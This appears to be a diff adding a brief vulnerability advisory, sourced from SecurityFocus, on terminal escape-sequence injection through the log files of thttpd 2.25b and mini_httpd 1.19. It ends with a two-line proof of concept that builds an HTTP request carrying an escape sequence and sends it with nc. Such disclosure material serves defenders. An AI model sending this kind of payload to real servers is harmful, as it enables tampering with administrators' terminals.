@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/37714/info
+
+Acme 'thttpd' and 'mini_httpd' are prone to a command-injection vulnerability because they fail to adequately sanitize user-supplied input in logfiles.
+
+Attackers can exploit this issue to execute arbitrary commands in a terminal.
+
+This issue affects thttpd 2.25b and mini_httpd 1.19; other versions may also be affected. 
+
+echo -en "GET /\x1b]2;owned?\x07\x0a\x0d\x0a\x0d" > payload
+nc localhost 80 < payload
